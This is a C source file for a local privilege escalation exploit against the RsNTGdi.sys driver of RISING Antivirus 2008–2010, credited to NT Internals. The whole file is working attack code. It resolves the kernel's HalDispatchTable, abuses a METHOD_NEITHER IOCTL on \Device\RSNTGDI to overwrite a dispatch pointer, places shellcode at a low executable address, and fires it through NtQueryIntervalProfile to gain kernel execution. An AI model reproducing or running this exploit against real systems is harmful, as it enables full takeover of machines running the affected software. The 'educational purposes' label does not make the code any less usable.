////////////////////////////////////////////////////////////////////////////////////
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | Beijing Rising International Software Co.,Ltd.                             | //
// | http://www.rising-global.com/                                              | //
// |                                                                            | //
// | Affected Software:                                                         | //
// | RISING Antivirus 2008/2009/2010                                            | //
// |                                                                            | //
// | Affected Driver:                                                           | //
// | RsNTGDI - RsNTGdi.sys                                                      | //
// |                                                                            | //
// | Local Privilege Escalation Exploit                                         | //
// | For Educational Purposes Only !                                            | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | NT Internals - http://www.ntinternals.org/                                 | //
// | alex ntinternals org                                                       | //
// | 28 January 2010                                                            | //
// |                                                                            | //
// | References:                                                                | //
// | RISING Antivirus 2008/2009/2010 Privilege Escalation Vulnerability         | //
// | http://www.ntinternals.org/ntiadv0902/ntiadv0902.html                      | //
// |                                                                            | //
// | Exploiting Common Flaws in Drivers                                         | //
// | Ruben Santamarta - http://www.reversemode.com/                             | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
////////////////////////////////////////////////////////////////////////////////////

#include "RsNTGdi_Exp.h"
#include "InvbShellCode.h"

#define BUFFER_LENGTH 0x04
#define IOCTL_METHOD_NEITHER 0x83003C0B

PVOID RtlAllocateMemory(
    IN ULONG Length)
{
    NTSTATUS NtStatus;

    PVOID BaseAddress = NULL;


    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(),
                                       &BaseAddress,
                                       0,
                                       &Length,
                                       MEM_RESERVE |
                                       MEM_COMMIT,
                                       PAGE_READWRITE);

    if(NtStatus == STATUS_SUCCESS)
    {
        RtlZeroMemory(BaseAddress, Length);

        return BaseAddress;
    }

    return NULL;
}

VOID RtlFreeMemory(
    IN PVOID BaseAddress)
{
    NTSTATUS NtStatus;

    ULONG FreeSize = 0;


    NtStatus = NtFreeVirtualMemory(
                                   NtCurrentProcess(),
                                   &BaseAddress,
                                   &FreeSize,
                                   MEM_RELEASE);
}

int __cdecl main(int argc, char **argv)
{
    NTSTATUS NtStatus;

    HANDLE DeviceHandle;
    ULONG ReturnLength = 0;
    
    ULONG ImageBase;
    PVOID MappedBase;
    UCHAR ImageName[KERNEL_NAME_LENGTH];
    ULONG DllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;
    PVOID HalDispatchTable;
    PVOID xHalQuerySystemInformation;
    PVOID MmUserProbeAddress;

    ULONG ShellCodeSize = PAGE_SIZE;
    PVOID ShellCodeAddress;
    PVOID BaseAddress = NULL;

    UNICODE_STRING DeviceName;
    UNICODE_STRING DllName;
    ANSI_STRING ProcedureName;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    SYSTEM_MODULE_INFORMATION_EX *ModuleInformation = NULL;
    LARGE_INTEGER Interval;

    ULONG TextColor;
    
    ///////////////////////////////////////////////////////////////////////////////////////////////

    system("cls");

    NtStatus = NtQuerySystemInformation(
                                        SystemModuleInformation,
                                        ModuleInformation,
                                        ReturnLength,
                                        &ReturnLength);
        
    if(NtStatus == STATUS_INFO_LENGTH_MISMATCH)
    {
        ReturnLength = (ReturnLength & 0xFFFFF000) + PAGE_SIZE * sizeof(ULONG);
        
        ModuleInformation = RtlAllocateMemory(ReturnLength);

        if(ModuleInformation)
        {
            NtStatus = NtQuerySystemInformation(
                                                SystemModuleInformation,
                                                ModuleInformation,
                                                ReturnLength,
                                                NULL);

            if(NtStatus == STATUS_SUCCESS)
            {
                ImageBase = (ULONG)(ModuleInformation->Modules[0].Base);

                RtlMoveMemory(
                              ImageName,
                              (PVOID)(ModuleInformation->Modules[0].ImageName +
                              ModuleInformation->Modules[0].ModuleNameOffset),
                              KERNEL_NAME_LENGTH);

//                 printf(" +----------------------------------------------------------------------------+\n"
//                        " | ImageBase - 0x%.8X                                                     |\n"
//                        " | ImageName - %s                                                   |\n",
//                        ImageBase,
//                        ImageName);


                RtlFreeMemory(ModuleInformation);


                RtlCreateUnicodeStringFromAsciiz(&DllName, (PUCHAR)ImageName);


                NtStatus = LdrLoadDll(
                                      NULL,                // DllPath
                                      &DllCharacteristics, // DllCharacteristics
                                      &DllName,            // DllName
                                      &MappedBase);        // DllHandle

                if(NtStatus)
                {
                    printf(" [*] NtStatus of LdrLoadDll - %.8X\n", NtStatus);    
                    return NtStatus;
                }


                RtlInitAnsiString(&ProcedureName, "HalDispatchTable");


                NtStatus = LdrGetProcedureAddress(
                                                  (PVOID)MappedBase,          // DllHandle
                                                  &ProcedureName,             // ProcedureName
                                                  0,                          // ProcedureNumber OPTIONAL
                                                  (PVOID*)&HalDispatchTable); // ProcedureAddress

                if(NtStatus)
                {
                    printf(" [*] NtStatus of LdrGetProcedureAddress - %.8X\n", NtStatus);    
                    return NtStatus;
                }

                (ULONG)HalDispatchTable -= (ULONG)MappedBase;
                (ULONG)HalDispatchTable += ImageBase;

                (ULONG)xHalQuerySystemInformation = (ULONG)HalDispatchTable + sizeof(ULONG);

//                 printf(" |                                                                            |\n"
//                        " | HalDispatchTable - 0x%.8X                                              |\n"
//                        " | xHalQuerySystemInformation - 0x%.8X                                    |\n"
//                        " +----------------------------------------------------------------------------+\n",
//                        HalDispatchTable,
//                        xHalQuerySystemInformation);


                NtStatus = XxInitInbv(ImageBase, (ULONG)MappedBase);

                if(NtStatus)
                {
                    printf(" [*] NtStatus of XxInitInbv - %.8X\n", NtStatus);	
                    return NtStatus;
                }

                LdrUnloadDll((PVOID)MappedBase);


                RtlInitUnicodeString(&DeviceName, L"\\Device\\RSNTGDI");

                ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
                ObjectAttributes.RootDirectory = 0;
                ObjectAttributes.ObjectName = &DeviceName;
                ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
                ObjectAttributes.SecurityDescriptor = NULL;
                ObjectAttributes.SecurityQualityOfService = NULL;

                NtStatus = NtCreateFile(
                                        &DeviceHandle,     // FileHandle
                                        FILE_READ_DATA |
                                        FILE_WRITE_DATA,   // DesiredAccess
                                        &ObjectAttributes, // ObjectAttributes
                                        &IoStatusBlock,    // IoStatusBlock
                                        NULL,              // AllocationSize OPTIONAL
                                        0,                 // FileAttributes
                                        FILE_SHARE_READ |
                                        FILE_SHARE_WRITE, // ShareAccess
                                        FILE_OPEN_IF,     // CreateDisposition
                                        0,                // CreateOptions
                                        NULL,             // EaBuffer OPTIONAL
                                        0);               // EaLength

                if(NtStatus)
                {
                    printf(" [*] NtStatus of NtCreateFile - %.8X\n", NtStatus);    
                    return NtStatus;
                }

                TextColor = 0;

                NtStatus = NtDeviceIoControlFile(
                                                 DeviceHandle,         // FileHandle
                                                 NULL,                 // Event
                                                 NULL,                 // ApcRoutine
                                                 NULL,                 // ApcContext
                                                 &IoStatusBlock,       // IoStatusBlock
                                                 IOCTL_METHOD_NEITHER, // IoControlCode
                                                 &TextColor,           // InputBuffer
                                                 BUFFER_LENGTH,        // InputBufferLength
                                                 &TextColor,           // OutputBuffer
                                                 BUFFER_LENGTH);       // OutBufferLength
                
                if(NtStatus)
                {
                    printf(" [*] NtStatus of NtDeviceIoControlFile [1] - %.8X\n", NtStatus);
                    return NtStatus;
                }


                NtStatus = NtDeviceIoControlFile(
                                                 DeviceHandle,
                                                 NULL,
                                                 NULL,
                                                 NULL,
                                                 &IoStatusBlock,
                                                 IOCTL_METHOD_NEITHER,
                                                 &TextColor,
                                                 BUFFER_LENGTH,
                                                 (PVOID)xHalQuerySystemInformation,
                                                 BUFFER_LENGTH);
                
                if(NtStatus)
                {
                    printf(" [*] NtStatus of NtDeviceIoControlFile [2] - %.8X\n", NtStatus);
                    return NtStatus;
                }


                ShellCodeAddress = (PVOID)sizeof(ULONG);

                NtStatus = NtAllocateVirtualMemory(
                                                   NtCurrentProcess(),      // ProcessHandle
                                                   &ShellCodeAddress,       // BaseAddress
                                                   0,                       // ZeroBits
                                                   &ShellCodeSize,          // AllocationSize
                                                   MEM_RESERVE | 
                                                   MEM_COMMIT |
                                                   MEM_TOP_DOWN,            // AllocationType
                                                   PAGE_EXECUTE_READWRITE); // Protect

                if(NtStatus)
                {
                    printf(" [*] NtStatus of NtAllocateVirtualMemory - %.8X\n", NtStatus);    
                    return NtStatus;
                }

				printf("NtAllocateVirtualMemory ShellCodeAddress = %08X\n", ShellCodeAddress); 

                RtlMoveMemory(
                              ShellCodeAddress,
                              (PVOID)InbvShellCode,
                              ShellCodeSize);

                Interval.LowPart = 0xFF676980;
                Interval.HighPart = 0xFFFFFFFF;

                printf("\n 3");
                NtDelayExecution(FALSE, &Interval);

                printf(" 2");
                NtDelayExecution(FALSE, &Interval);

                printf(" 1");
                NtDelayExecution(FALSE, &Interval);

                printf(" Hoop\n\n");
                NtDelayExecution(FALSE, &Interval);


                NtStatus = NtQueryIntervalProfile(
                                                  ProfileTotalIssues, // Source
                                                  NULL);              // Interval

                if(NtStatus)
                {
                    printf(" [*] NtStatus of NtQueryIntervalProfile - %.8X\n", NtStatus);
                    return NtStatus;
                }

				printf("NtQueryIntervalProfile ok!\n");
                

                NtStatus = NtClose(DeviceHandle);

                if(NtStatus)
                {
                    printf(" [*] NtStatus of NtClose - %.8X\n", NtStatus);    
                    return NtStatus;
                }

				printf("NtClose ok!\n");
            }
        }
    }
    
    return FALSE;
}